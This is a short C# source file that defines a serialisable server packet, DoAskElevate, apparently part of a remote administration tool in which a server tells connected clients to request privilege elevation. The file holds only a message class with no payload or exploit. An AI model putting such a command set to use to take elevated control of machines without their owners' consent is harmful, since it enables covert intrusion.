using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class DoAskElevate : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.DoAskElevate;
            }
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
